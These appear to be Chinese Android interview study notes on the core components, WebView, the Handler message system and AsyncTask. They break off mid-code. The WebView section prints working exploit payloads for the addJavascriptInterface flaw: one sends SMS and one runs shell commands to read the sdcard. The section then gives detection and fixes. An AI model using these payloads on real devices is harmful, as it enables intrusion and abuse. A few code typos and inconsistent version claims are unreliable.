### Activity

#### 1. 什么是Activity

四大组件之一，通常一个用户交互界面对应一个activity。activity是Context的子类，同时实现了window.callback和keyevent.callback，可以处理与窗体用户交互的事件。
开发中常用的有FragmentActivity、ListActivity、TabActivity（Android 4.0被Fragment取代）

#### 2. Activity的4种状态

* running：用户可以点击，activity处于栈顶状态。
* paused：activity失去焦点的时候，被一个非全屏的activity占据或者被一个透明的activity覆盖，这个状态的activity并没有销毁，它所有的状态信息和成员变量仍然存在，只是不能够被点击。(除了内存紧张的情况，这个activity有可能被回收)
* stopped：这个activity被另外一个activity完全覆盖，但是这个activity的所有状态信息和成员变量仍然存在(除了内存紧张)
* killed：这个activity已经被销毁，其所有的状态信息和成员变量已经不存在了。

#### 3. Activity生命周期

![Activity生命周期](http://upload-images.jianshu.io/upload_images/2570030-fd049b68b584258b?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

##### 生命周期的基本介绍

* onCreate：当Activity第一次启动调用
* onDestroy：当Activity销毁的时候调用
* onStart：当Activity变成可见调用
* onStop：当Activity不可见调用
* onResume：当Activity可以交互调用这个方法 当界面上的按钮被点击的时候调用
* onPause：当Activity不可以交互调用这个方法 当界面上的按钮不可以点击
* onRestart：当界面重新启动的时候调用

##### 生命周期流程

* Activity启动：调用的依次顺序是：onCreate ---> onStart ---> onResume ---> onPause ---> onStop ---> onDestroy，还有一个onRestart，其中onRestart是在Activity被onStop后，但是没有被onDestroy，在再次启动此Activity时调用的（而不再调用onCreate）方法；如果被onDestroy了，则是调用onCreate方法。
* 点击Home键回到主界面（Activity不可见）：onPause ---> onStop
* 当我们再次回到原Activity时： onRestart ---> onStart ---> onResume
* 退出当前Activity时： onPause ---> onStop ---> onDestroy

#### 4. Android进程优先级

* 前台进程：Foreground process

    用户正在交互的Activity（onResume()）
    当某个Service绑定正在交互的Activity
    被主动调用为前台Service（startForeground()）
    组件正在执行生命周期的回调（onCreate()、onStart()、onDestory()）
    BroadcastReceiver正在执行onReceive()

* 可见进程：Visible process

    我们的Activity处在onPause()（没有进入onStop()）
    绑定到前台Activity的Service

* 服务进程：Service process

    简单的startService()启动。

* 后台进程：Background process

    对用户没有直接影响的进程 --- Activity处于onStop()的时候。
    android:process=":xxx"

* 空进程：Empty process

    不含有任何的活动的组件。（Android设计的，处于缓存的目的，为了第二次启动更快，采取的一个权衡）

#### 5. Activity任务栈

* 有序地管理Activity的先进后出的一种数据结构
* 安全退出：任务栈中所有的Activity都出栈

#### 6. Activity的启动模式

* standard 标准模式：

    特点：此模式不管有没有已存在的实例，都生成新的实例。每次调用startActivity()启动Activity时都会创建一个新的Activity放在栈顶，每次返回都会销毁实例并出栈，可以重复创建。

* singleTop 单一顶部模式/栈顶复用模式：

    特点：会检查任务栈栈顶的Activity，如果发现栈顶已经存在实例，就不会创建新的实例，直接复用，此时会调用onNewIntent。但如果不在栈顶，那么还是会创建新的实例。
    应用场景：浏览器书签的页面，流氓的网站，避免创建过多的书签页面

* singleTask 单一任务模式/栈内复用模式：

    特点：这种模式不会检查任务栈的栈顶,检查当前任务栈，如果发现有实例存在，直接复用。任务栈中只有一个实例存储（把当前activity上面的所有的其它activity都清空，复用这个已经存在的activity）
    应用场景：浏览器浏览页面的Activity，播放器播放的activity。

* singleInstance 单一实例模式（用得比较少）

	特点：系统会为这个Activity单独创建一个任务栈，这个任务栈里面只有一个实例存在并且保证不再有其它activity实例进入。
	应用场景：来电页面。

#### 7. Scheme跳转协议

##### 概念

Android中的scheme是一种页面内跳转协议，是一种非常好的实现机制，通过定义自己的scheme协议，可以非常方便跳转app中的各个页面；通过scheme协议，服务器可以定制化告诉app跳转哪个页面，可以通过通知栏消息定制化跳转页面，可以通过H5页面跳转页面等。

##### 应用场景

* 通过服务器下发跳转路径跳转相应页面
* 通过在H5页面的锚点跳转相应的页面
* 根据服务器下发通知栏消息，App跳转相应的页面（包括另外一个APP的页面，作为推广使用）

#### 8. 参考文章

[Android面试（一）：Activity面试你所需知道的一切](https://www.jianshu.com/p/5b11a9eddf86)

[android-Scheme与网页跳转原生的三种方式](https://blog.csdn.net/sinat_31057219/article/details/78362326)

### Fragment

#### 1. 什么是Fragment

Fragment，俗称碎片，自Android 3.0开始被引进并大量使用。作为Activity界面的一部分，Fragment的存在必须依附于Activity，并且与Activity一样，拥有自己的生命周期，同时处理用户的交互动作。同一个Activity可以有一个或多个Fragment作为界面内容，并且可以动态添加、删除Fragment，灵活控制UI内容，也可以用来解决部分屏幕适配问题。

#### 2. Fragment为什么被称为第五大组件

首先Fragment的使用次数是不输于其他四大组件的，而且Fragment有自己的生命周期，比Activity更加节省内存，切换模式也更加舒适，使用频率不低于四大组件。

#### 3. Fragment的生命周期

![Fragment的生命周期](https://upload-images.jianshu.io/upload_images/2570030-bb960a5fce263a3f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![Fragment的生命周期](https://upload-images.jianshu.io/upload_images/2570030-9ca614fe1d9416b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#### 4. Fragment创建/加载到Activity的两种方式

* 静态加载

    1. 创建Fragment的xml布局文件
    2. 在Fragment的onCreateView中inflate布局，返回
    3. 在Activity的布局文件中的适当位置添加fragment标签，指定name为Fragment的完整类名（这时候Activity中可以直接通过findViewById找到Fragment中的控件）

* 动态加载（需要用到事务操作，常用）

    1. 创建Fragment的xml布局文件
    2. 在Fragment的onCreateView中inflate布局，返回

        ```java
        @Nullable
        @Override
        public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
            return inflater.inflate(R.layout.activity_main, container, false);
        }
        ```

    3. 在Activity中通过获取FragmentManager（SupportFragmentManager），通过beginTransaction()方法开启事务
    4. 进行add()/remove()/replace()/attach()/detach()/hide()/addToBackStack()事务操作（都是对Fragment的栈进行操作，其中add()指定的tag参数可以方便以后通过findFragmentByTag()找到这个Fragment）
    5. 提交事务：commit()

        示例代码：
        ```java
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            getSupportFragmentManager().beginTransaction()
                    .add(R.id.fragment_container, new TestFragment(), "test")
                    .commit();
            TestFragment f = (TestFragment) getSupportFragmentManager().findFragmentByTag("test");
        }
        ```

#### 5. Fragment通信问题

1. 通过findFragmentByTag或者getActivity获得对方的引用（强转）之后，再相互调用对方的public方法。

    优点：简单粗暴
    缺点：引入了“强转”的丑陋代码，另外两个类之间各自持有对方的强引用，耦合较大，容易造成内存泄漏

2. 通过Bundle的方法进行传值，在添加Fragment的时候进行通信

    ```java
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Fragment fragment = new TestFragment();
        Bundle bundle = new Bundle();
        bundle.putString("key", "value");
        //Activity中对fragment设置一些参数
        fragment.setArguments(bundle);
        getSupportFragmentManager().beginTransaction()
                .add(R.id.fragment_container, fragment, "test")
                .commit();
    }
    ```

    优点：简单粗暴
    缺点：只能在Fragment添加到Activity的时候才能使用，属于单向通信

3. 利用eventbus进行通信

    优点：实时性高，双向通信，Activity与Fragment之间可以完全解耦
    缺点：反射影响性能，无法获取返回数据，EventBUS难以维护

4. 利用接口回调进行通信（Google官方推荐）

    ```java
    //MainActivity实现MainFragment开放的接口
    public class MainActivity extends FragmentActivity implements FragmentListener {
        @override
        public void toH5Page() {
            //...其他处理代码省略
        }
    }
    //Fragment的实现
    public class MainFragment extends Fragment {
        //接口的实例，在onAttach Activity的时候进行设置
        public FragmentListener mListener;
        //MainFragment开放的接口
        public static interface FragmentListener {
            //跳到h5页面
            void toH5Page();
        }
        @Override
        public void onAttach(Activity activity) {
            super.onAttach(activity);
            //对传递进来的Activity进行接口转换
            if (activity instance FragmentListener){
                mListener = ((FragmentListener) activity);
            }
        }
         ...其他处理代码省略
    }
    ```

    优点：既能达到复用，又能达到很好的可维护性，并且性能得到保证
    缺点：假如项目很大了，Activity与Fragment的数量也会增加，这时候为每对Activity与Fragment交互定义交互接口就是一个很麻烦的问题（包括为接口的命名，新定义的接口相应的Activity还得实现，相应的Fragment还得进行强制转换）

5. 通过Handler进行通信（其实就是把接口的方式改为Handler）

    优点：既能达到复用，又能达到很好的可维护性，并且性能得到保证
    缺点：Fragment对具体的Activity存在耦合，不利于Fragment复用和维护，没法获取Activity的返回数据

6. 通过广播/本地广播进行通信

    优点：简单粗暴
    缺点：大材小用，存在性能损耗，传播数据必须实现序列化接口

7. 父子Fragment之间通信，可以使用getParentFragment()/getChildFragmentManager()的方式进行

#### 6. FragmentPageAdapter和FragmentPageStateAdapter的区别

* FragmentPageAdapter在每次切换页面的时候，是将Fragment进行分离，适合页面较少的Fragment使用以保存一些内存，对系统内存不会多大影响

    ```java
    @Override
    public void destroyItem(ViewGroup container, int position, Object object) {
        if (mCurTransaction == null) {
            mCurTransaction = mFragmentManager.beginTransaction();
        }
        if (DEBUG) Log.v(TAG, "Detaching item #" + getItemId(position) + ": f=" + object
                + " v=" + ((Fragment)object).getView());
        //FragmentPageAdapter在destroyItem的时候调用detach
        mCurTransaction.detach((Fragment)object);
    }
    ```

* FragmentPageStateAdapter在每次切换页面的时候，是将Fragment进行回收，适合页面较多的Fragment使用，这样就不会消耗更多的内存

    ```java
    @Override
    public void destroyItem(ViewGroup container, int position, Object object) {
        Fragment fragment = (Fragment) object;
        if (mCurTransaction == null) {
            mCurTransaction = mFragmentManager.beginTransaction();
        }
        if (DEBUG) Log.v(TAG, "Removing item #" + position + ": f=" + object
                + " v=" + ((Fragment)object).getView());
        while (mSavedState.size() <= position) {
            mSavedState.add(null);
        }
        mSavedState.set(position, fragment.isAdded()
                ? mFragmentManager.saveFragmentInstanceState(fragment) : null);
        mFragments.set(position, null);
        //FragmentPageStateAdapter在destroyItem的时候调用remove
        mCurTransaction.remove(fragment);
    }
    ```

#### 7. 参考文章

[Android：Activity与Fragment通信(99%)完美解决方案](https://www.jianshu.com/p/1b824e26105b)

### Service

#### 1. 什么是Service

Service是四大组件之一，它可以在后台执行长时间运行操作而没有用户界面的应用组件

#### 2. Service的两种启动方式与生命周期

![Service的两种启动方式与生命周期](https://upload-images.jianshu.io/upload_images/2570030-9cc42d42d66337e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

startService特点：

1. 使用这种start方式启动的Service的生命周期如下：onCreate()--->onStartCommand()（onStart()方法已过时） ---> onDestroy()
2. 如果服务已经开启，不会重复的执行onCreate()， 而是会调用onStart()和onStartCommand()
3. 一旦服务开启跟调用者(开启者)就没有任何关系了。
4. 开启者退出了，开启者挂了，服务还在后台长期的运行。
5. 开启者不能调用服务里面的方法。

bindService特点：

1. 使用这种start方式启动的Service的生命周期如下：onCreate() --->onBind()--->onUnbind()--->onDestroy()
2. 绑定服务不会调用onStart()或者onStartCommand()方法
3. bind的方式开启服务，绑定服务。调用者调用unbindService解除绑定，服务也会跟着销毁。
4. 绑定者可以调用服务里面的方法。

#### 3. Service和Thread的区别
        
* Service是安卓中系统的组件，它运行在独立进程的主线程中，默认情况下不可以执行耗时操作（否则ANR）
* Thread是程序执行的最小单元，分配CPU的基本单位，可以开启子线程执行耗时操作
* Service在不同Activity中可以获取自身实例，可以方便的对Service进行操作
* Thread的运行是独立于Activity的，也就是说当一个Activity被finish之后，如果没有主动停止Thread或者Thread里的run方法没有执行完毕的话，Thread也会一直执行，引发内存泄漏；另一方面，没有办法在不同的Activity中对同一Thread进行控制。  

### Broadcast

#### 1. BroadcastReceiver是什么

BroadcastReceiver是四大组件之一，是一种广泛运用在应用程序之间传输信息的机制，通过发送Intent来传送我们的数据。

#### 2. BroadcastReceiver的使用场景
        
* 不同组件之间的消息通信（应用内/应用内不同进程/不同进程（应用））
* 与Android系统在特定情况下的通信（如电话呼入、蓝牙状态变化等）
* 线程之间的通信

#### 3. Broadcast种类

1. 普通广播（Normal Broadcast）
    
    * 通过sendBroadcast进行发送，如果注册了Action匹配的接受者则会收到
    * 若发送广播有相应权限，那么广播接收者也需要相应权限
    
2. 系统广播（System Broadcast）

    * Android中内置了多个系统广播：只要涉及到手机的基本操作（如开机、网络状态变化、拍照等等），都会发出相应的广播
    * 每个广播都有特定的Intent - Filter（包括具体的action）
    * 系统广播由系统发送，不需要手动发送，只需要注册监听

3. 有序广播（Ordered Broadcast）

    * 通过sendOrderedBroadcast发送
    * 发送出去的广播被广播接收者按照先后顺序接收（有序是针对广播接收者而言的）
    * 广播接受者接收广播的顺序规则：Priority大的优先；动态注册的接收者优先
    * 先接收的可以对广播进行截断和修改

4. App应用内广播（本地广播、Local Broadcast）

    * 通过LocalBroadcastManager.getInstance(this).sendBroadcastSync();
    * App应用内广播可理解为一种局部广播，广播的发送者和接收者都同属于一个App
    * 相比于全局广播（普通广播），App应用内广播优势体现在：安全性高 & 效率高（本地广播只会在APP内传播，安全性高；不允许其他APP对自己的APP发送广播，效率高）

5. 粘性广播（Sticky Broadcast）

    * 在Android5.0 & API 21中已经失效，所以不建议使用
    * 通过sendStickyBroadcast发送
    * 粘性广播在发送后就一直存在于系统的消息容器里面，等待对应的处理器去处理，如果暂时没有处理器处理这个广播则一直在消息容器里面处于等待状态
    * 粘性广播的Receiver如果被销毁，那么下次重新创建的时候会自动接收到消息数据
    
#### 4. 广播的注册方式

* 静态注册：也称为清单注册，就是在AndroidManifest.xml中注册的广播。此类广播接收器在应用尚未启动的时候就可以接收到相应广播。
* 动态注册：也称为运行时注册，也就是在Service或者Activity组件中，通过Context.registerReceiver()注册广播接收器。此类广播接收器是在应用已启动后，通过代码进行注册。生命周期与组件一致。

#### 5. 广播的实现机制

![广播的实现机制](https://upload-images.jianshu.io/upload_images/2570030-6b1cca250e64e07a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#### 6. 本地广播的使用以及实现机制

* 基本使用：可以通过intent.setPackage(packageName)指定包名，也可以使用localBroadcastManager（常用），示例代码如下：

    ```java
    //注册应用内广播接收器
    //步骤1：实例化BroadcastReceiver子类 & IntentFilter mBroadcastReceiver 
    mBroadcastReceiver = new mBroadcastReceiver();
    IntentFilter intentFilter = new IntentFilter();
    
    //步骤2：实例化LocalBroadcastManager的实例
    localBroadcastManager = LocalBroadcastManager.getInstance(this);
    
    //步骤3：设置接收广播的类型 
    intentFilter.addAction(android.net.conn.CONNECTIVITY_CHANGE);
    
    //步骤4：调用LocalBroadcastManager单一实例的registerReceiver（）方法进行动态注册 
    localBroadcastManager.registerReceiver(mBroadcastReceiver, intentFilter);
    
    //取消注册应用内广播接收器
    localBroadcastManager.unregisterReceiver(mBroadcastReceiver);
    
    //发送应用内广播
    Intent intent = new Intent();
    intent.setAction(BROADCAST_ACTION);
    localBroadcastManager.sendBroadcast(intent);
    ```

* localBroadcastManager的实现机制

    1. LocalBroadcastManager高效的原因主要是因为它内部是通过Handler实现的，它的sendBroadcast()方法含义和我们平时所用的全局广播不一样，它的sendBroadcast()方法其实是通过handler发送一个Message实现的。
    2. 既然是它内部是通过Handler来实现广播的发送的，那么相比与系统广播通过Binder实现那肯定是更高效了，同时使用Handler来实现，别的应用无法向我们的应用发送该广播，而我们应用内发送的广播也不会离开我们的应用
    3. LocalBroadcastManager内部协作主要是靠这两个Map集合：mReceivers和mActions，当然还有一个List集合mPendingBroadcasts，这个主要就是存储待接收的广播对象

#### 7. 参考文章

[Android四大组件：BroadcastReceiver史上最全面解析](https://www.jianshu.com/p/ca3d87a4cdf3)

[Android 粘性广播StickyBroadcast的使用](http://www.codeweblog.com/android-%E7%B2%98%E6%80%A7%E5%B9%BF%E6%92%ADstickybroadcast%E7%9A%84%E4%BD%BF%E7%94%A8/)

[咦，Oreo怎么收不到广播了？](https://blog.csdn.net/dfghhvbafbga/article/details/80223938)

[LocalBroadcastManager—创建更高效、更安全的广播](https://blog.csdn.net/u010687392/article/details/49744579)


### WebView

#### 1. WebView远程代码执行安全漏洞

##### 漏洞描述

Android API level 16以及之前的版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法。

简单的说就是通过addJavascriptInterface给WebView加入一个JavaScript桥接接口，JavaScript通过调用这个接口可以直接操作本地的JAVA接口。

##### 示例代码

WebView代码如下所示：

```java
mWebView = new WebView(this);
mWebView.getSettings().setJavaScriptEnabled(true);
mWebView.addJavascriptInterface(this, "injectedObj");
mWebView.loadUrl("file:///android_asset/www/index.html");
```

发送恶意短信：

```html
<html>
   <body>
      <script>
         var objSmsManager = injectedObj.getClass().forName("android.telephony.SmsManager").getM ethod("getDefault",null).invoke(null,null);
          objSmsManager.sendTextMessage("10086",null,"this message is sent by JS when webview is loading",null,null);
       </script>
   </body>
</html>
```

利用反射机制调用Android API getRuntime执行shell命令，最终操作用户的文件系统：

```html
<html>
   <body>
      <script>
         function execute(cmdArgs)
         {
             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
         }

         var res = execute(["/system/bin/sh", "-c", "ls -al /mnt/sdcard/"]);
         document.write(getContents(res.getInputStream()));
       </script>
   </body>
</html>
```

##### 漏洞检测

1. 检查应用源代码中是否调用Landroid/webkit/WebView类中的addJavascriptInterface方法，是否存在searchBoxJavaBridge_、accessibility、accessibilityTraversal接口
2. 在线检测：腾讯TSRC在线检测页面（http://security.tencent.com/lucky/check_tools.html）、乌云知识库在线检测（http://drops.wooyun.org/webview.html）
3. 在线检测原理：遍历所有window的对象，然后找到包含getClass方法的对象,如果存在此方法的对象则说明该接口存在漏洞。

##### 漏洞修复

1. 允许被调用的函数必须以@JavascriptInterface进行注解（API Level小于17的应用也会受影响）
2. 建议不要使用addJavascriptInterface接口，以免带来不必要的安全隐患，采用动态地生成将注入的JS代码的方式来代替
3. 如果一定要使用addJavascriptInterface接口:

    1. 如果使用HTTPS协议加载URL，应进行证书校验防止访问的页面被篡改挂马；
    2. 如果使用HTTP协议加载URL，应进行白名单过滤、完整性校验等防止访问的页面被篡改；
    3. 如果加载本地Html，应将html文件内置在APK中，以及进行对html页面完整性的校验；

4. 移除Android系统内部的默认内置接口

    ```java
    removeJavascriptInterface("searchBoxJavaBridge_");
    removeJavascriptInterface("accessibility");
    removeJavascriptInterface("accessibilityTraversal");
    ```
             
#### 2. JSBridge

客户端和服务端之间可以通过JSBridge来互相调用各自的方法，实现双向通信

#### 3. WebView的正确销毁与内存泄漏问题

由于WebView是依附于Activity的，Activity的生命周期和WebView启动的线程的生命周期是不一致的，这会导致WebView一直持有对这个Activity的引用而无法释放，解决方案如下

1. 独立进程，简单暴力，不过可能涉及到进程间通信（推荐）
2. 动态添加WebView，对传入WebView中使用的Context使用弱引用
3. 正确销毁WebView，WebView在其他容器上时（如：LinearLayout），当销毁Activity时，需要：

    1. 在onDestroy()中先移除容器上的WebView
    2. 然后再将WebView.destroy()，这样就不会导致内存泄漏

#### 4. WebView后台耗电
        
##### 问题

在WebView加载页面的时候，会自动开启线程去加载，如果不很好的关闭这些线程，就会导致电量消耗加大。

##### 解决方法

可以采用暴力的方法，直接在onDestroy方法中System.exit(0)结束当前正在运行中的java虚拟机

#### 5. WebView硬件加速

##### WebView硬件加速以及缺点
        
Android3.0引入硬件加速，默认会开启，WebView在硬件加速的情况下滑动更加平滑，性能更加好，但是会出现白块或者页面闪烁的副作用。

##### 解决方案

建议在需要的地方WebView暂时关闭硬件加速

#### 6. WebViewClient的onPageFinished问题

##### 问题
      
WebViewClient.onPageFinished在每次页面加载完成的时候调用，但是遇到未加载完成的页面跳转其他页面时，就会被一直调用

##### 解决方案

使用WebChromeClient.onProgressChanged替代WebViewClient.onPageFinished

#### 7. 参考文章

[WebView 远程代码执行漏洞浅析](https://blog.csdn.net/feizhixuan46789/article/details/49155369)

[Android WebView远程执行代码漏洞浅析](https://blog.csdn.net/fengling59/article/details/50379522)

[Android WebView 远程代码执行漏洞简析](http://www.droidsec.cn/android-webview-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%A3%80%E6%B5%8B/)

[在WebView中如何让JS与Java安全地互相调用](https://blog.csdn.net/xyz_lmn/article/details/39399225)

### Android系统架构与Framework源码分析

#### 1. Android系统架构

![Android系统架构](http://upload-images.jianshu.io/upload_images/2570030-b9a18bc4b26c498e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

根据上图，Android系统架构从上往下分别是：

1. 应用框架：应用框架最常被应用开发者使用。作为硬件开发者，我们应该非常了解开发者 API，因为很多此类 API 都可直接映射到底层 HAL 接口，并可提供与实现驱动程序相关的实用信息。
2. Binder IPC：Binder 进程间通信 (IPC) 机制允许应用框架跨越进程边界并调用 Android 系统服务代码，从而使得高级框架 API 能与 Android 系统服务进行交互。在应用框架级别，开发者无法看到此类通信的过程，但一切似乎都在“按部就班地运行”。
3. 系统服务：应用框架 API 所提供的功能可与系统服务通信，以访问底层硬件。服务是集中的模块化组件，例如窗口管理器、搜索服务或通知管理器。Android 包含两组服务：“系统”（诸如窗口管理器和通知管理器之类的服务）和“媒体”（与播放和录制媒体相关的服务）。
4. 硬件抽象层 (HAL)：硬件抽象层 (HAL) 会定义一个标准接口以供硬件供应商实现，并允许 Android 忽略较低级别的驱动程序实现。借助 HAL，我们可以顺利实现相关功能，而不会影响或无需更改更高级别的系统。HAL 实现会被封装成模块 (.so) 文件，并会由 Android 系统适时地加载。
5. Linux 内核：开发设备驱动程序与开发典型的 Linux 设备驱动程序类似。Android 使用的 Linux 内核版本包含一些特殊的补充功能，例如：唤醒锁（这是一种内存管理系统，可更主动地保护内存）、Binder IPC 驱动程序以及对移动嵌入式平台非常重要的其他功能。这些补充功能主要用于增强系统功能，不会影响驱动程序开发。我们可以使用任一版本的内核，只要它支持所需功能（如 Binder 驱动程序）。不过，建议使用 Android 内核的最新版本。

#### 2. Android Framework源码分析

[写给Android App开发人员看的Android底层知识（1）- Binder与AIDL](http://www.cnblogs.com/Jax/p/6864103.html)

[写给Android App开发人员看的Android底层知识（2）- AMS与APP、Activity的启动流程](http://www.cnblogs.com/Jax/p/6880604.html)

[写给Android App开发人员看的Android底层知识（3）- AMS与APP、Activity的启动流程](http://www.cnblogs.com/Jax/p/6880631.html)

[写给Android App开发人员看的Android底层知识（4）- Context](http://www.cnblogs.com/Jax/p/6880647.html)

[写给Android App开发人员看的Android底层知识（5）- Service](http://www.cnblogs.com/Jax/p/6883549.html)

[写给Android App开发人员看的Android底层知识（6）- BroadcastReceiver](http://www.cnblogs.com/Jax/p/6883534.html)

[写给Android App开发人员看的Android底层知识（7）- ContentProvider](http://www.cnblogs.com/Jax/p/6910699.html)

[写给Android App开发人员看的Android底层知识（8）- PMS及App安装过程](http://www.cnblogs.com/Jax/p/6910745.html)

除此之外，还有消息机制、窗口管理等源码分析，推荐《开发艺术探索》，以及LooperJing的文集：

[Android源码解析](https://www.jianshu.com/nb/8017467)

* 备注：源码分析部分先放一放，后续补充一些简要概括性的

### 消息机制与Handler

#### 1. 基本概念

Android的消息机制主要包括Handler、MessageQueue和Looper。

Handler是Android中引入的一种让开发者参与处理线程中消息循环的机制。每个Handler都关联了一个线程，每个线程内部都维护了一个消息队列MessageQueue，这样Handler实际上也就关联了一个消息队列。可以通过Handler将Message和Runnable对象发送到该Handler所关联线程的MessageQueue（消息队列）中，然后该消息队列一直在循环拿出一个Message，对其进行处理，处理完之后拿出下一个Message，继续进行处理，周而复始。

#### 2. 为什么要有消息机制

Android的UI控件不是线程安全的，如果在多线程中访问UI控件则会导致不可预期的状态。那为什么不对UI控件访问加锁呢？

访问加锁缺点有两个：

1. 首先加锁会让UI控件的访问的逻辑变的复杂；
2. 其次，锁机制会降低UI的访问效率。

那我们不用线程来操作不就行了吗？但这是不可能的，因为Android的主线程不能执行耗时操作，否则会出现ANR。

所以，从各方面来说，Android消息机制是为了解决在子线程中无法访问UI的矛盾。

#### 3. Handler的工作原理

![Android消息机制.png](http://upload-images.jianshu.io/upload_images/2570030-2d4acc6406c28035.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

如图所示，在主线程ActivityThread中的main方法入口中，先是创建了系统的Handler（H），创建主线程的Looper，将Looper与主线程绑定，调用了Looper的loop方法之后开启整个应用程序的主循环。Looper里面有一个消息队列，通过Handler发送消息到消息队列里面，然后通过Looper不断去循环取出消息，交给Handler去处理。通过系统的Handler，或者说Android的消息处理机制就确保了整个Android系统有条不紊地运作，这是Android系统里面的一个比较重要的机制。

我们的APP也可以创建自己的Handler，可以是在主线程里面创建，也可以在子线程里面创建，但是需要手动创建子线程的Looper并且手动启动消息循环。

#### 4. Handler的内存泄漏问题

##### 原因

非静态内部类持有外部类的匿名引用，导致Activity无法释放（生命周期不一致）

##### 解决方案

* Handler内部持有外部Activity的弱引用
* Handler改为静态内部类
* 在适当时机移除Handler的所有Callback()

#### 5. 参考文章

[Android 源码分析之旅3.1--消息机制源码分析](https://www.jianshu.com/p/ac50ba6ba3a2)

[android消息机制原理详解](https://blog.csdn.net/ouyangfan54/article/details/55006558)

[Android中Handler的使用](https://blog.csdn.net/iispring/article/details/47115879)

### AsyncTask

#### 1. AsyncTask的基本概念与基本工作原理

它本质上就是一个封装了线程池和Handler的异步框架。

AsyncTask执行任务时，内部会创建一个进程作用域的线程池来管理要运行的任务，也就是说当你调用了AsyncTask.execute()后，AsyncTask会把任务交给线程池，由线程池来管理创建Thread和运行Thread。

#### 2. AsyncTask使用方法

##### 三个参数

* Params：表示后台任务执行时的参数类型，该参数会传给AysncTask的doInBackground()方法
* Progress：表示后台任务的执行进度的参数类型，该参数会作为onProgressUpdate()方法的参数
* Result：表示后台任务的返回结果的参数类型，该参数会作为onPostExecute()方法的参数
        
##### 五个方法

* onPreExecute()：异步任务开启之前回调，在主线程中执行
* doInBackground()：执行异步任务，在线程池中执行
* onProgressUpdate()：当doInBackground中调用publishProgress时回调，在主线程中执行
* onPostExecute()：在异步任务执行之后回调，在主线程中执行
* onCancelled()：在异步任务被取消时回调

#### 3. AsyncTask的版本差异

##### 内部的线程池的版本差异

1. 3.0之前规定同一时刻能够运行的线程数为5个，线程池总大小为128。也就是说当我们启动了10个任务时，只有5个任务能够立刻执行，另外的5个任务则需要等待，当有一个任务执行完毕后，第6个任务才会启动，以此类推。而线程池中最大能存放的线程数是128个，当我们尝试去添加第129个任务时，程序就会崩溃。
2. 因此在3.0版本中AsyncTask的改动还是挺大的，在3.0之前的AsyncTask可以同时有5个任务在执行，而3.0之后的AsyncTask同时只能有1个任务在执行。为什么升级之后可以同时执行的任务数反而变少了呢？这是因为更新后的AsyncTask已变得更加灵活，如果不想使用默认的线程池，还可以自由地进行配置。

##### 串行、并行的版本差异

1. AsyncTask在Android 2.3之前默认采用并行执行任务，AsyncTask在Android 2.3之后默认采用串行执行任务
2. 如果需要在Android 2.3之后采用并行执行任务，可以调用AsyncTask的executeOnExecutor()

#### 4. AsyncTask的缺陷

##### 内存泄漏问题

###### 原因

非静态内部类持有外部类的匿名引用，导致Activity无法释放（生命周期不一致，与Handler一样）
       
###### 解决方案

* AsyncTask内部持有外部Activity的弱引用
* AsyncTask改为静态内部类
* 在Activity销毁之前，调用AsyncTask.cancel()取消AsyncTask的运行，以此来保证程序的稳定

##### 结果丢失问题

###### 原因

在屏幕旋转、Activity在内存紧张时被回收等造成Activity重新创建时AsyncTask数据丢失的问题。当Activity销毁并重新创建后，还在运行的AsyncTask会持有一个Activity的非法引用即之前的Activity实例。导致onPostExecute()没有任何作用（一般是对UI更新无效）。

###### 解决方案

1. 在Activity重建之前cancel异步任务
2. 在重建之后重新执行异步任务

#### 5. 参考文章

[AsyncTask 使用和缺陷](https://blog.csdn.net/boyupeng/article/details/49001215)

### HandlerThread

#### 1. HandlerThread产生背景

重点（防止线程多次创建、销毁）：当系统有多个耗时任务需要执行时，每个任务都会开启一个新线程去执行耗时任务，这样会导致系统多次创建和销毁线程，从而影响性能。为了解决这一问题，Google提供了HandlerThread，HandlerThread是在线程中创建一个Looper循环器，让Looper轮询消息队列，当有耗时任务进入队列时，则不需要开启新线程，在原有的线程中执行耗时任务即可，否则线程阻塞。

HandlerThread集Thread和Handler之所长，适用于会长时间在后台运行，并且间隔时间内（或适当情况下）会调用的情况，比如上面所说的实时更新。

#### 2. HandlerThread的特点

* HandlerThread本质上是一个线程，继承自Thread，与线程池不同，HandlerThread是一个串行队列，背后只有一个线程
* HandlerThread有自己的Looper对象，可以进行Looper循环，可以创建Handler

    ```java
    public class HandlerThread extends Thread {
        Looper mLooper;
        private @Nullable Handler mHandler;
    }
    ```
    
* HandlerThread可以在Handler的handleMessage中执行异步方法，异步不会堵塞，减少对性能的消耗
* HandlerThread缺点是不能同时继续进行多任务处理，需要等待进行处理，处理效率较低

### IntentService

#### 1. IntentService是什么

* 重点（本质上也是为了节省资源）
* IntentService是继承自Service并处理异步请求的一个类，其内部采用HandlerThread和Handler实现的，在IntentService内有一个工作线程来处理耗时操作，其优先级比普通Service高
* 当任务完成后，IntentService会自动停止，而不需要手动调用stopSelf()
* 可以多次启动IntentService，每个耗时操作都会以工作队列的方式在IntentService中onHandlerIntent()回调方法中执行，并且每次只会执行一个工作线程

#### 2. IntentService使用方法
    
1. 创建Service继承自IntentService
2. 覆写构造方法和onHandlerIntent()方法
3. 在onHandlerIntent()中执行耗时操作

#### 3. IntentService工作原理

* IntentService继承自Service，内部有一个HandlerThread对象
* 在onCreate的时候会创建一个HandlerThread对象，并启动线程
* 紧接着创建ServiceHandler对象，ServiceHandler继承自Handler，用来处理消息。ServiceHandler将获取HandlerThread的Looper就可以开始正常工作了

    ```java
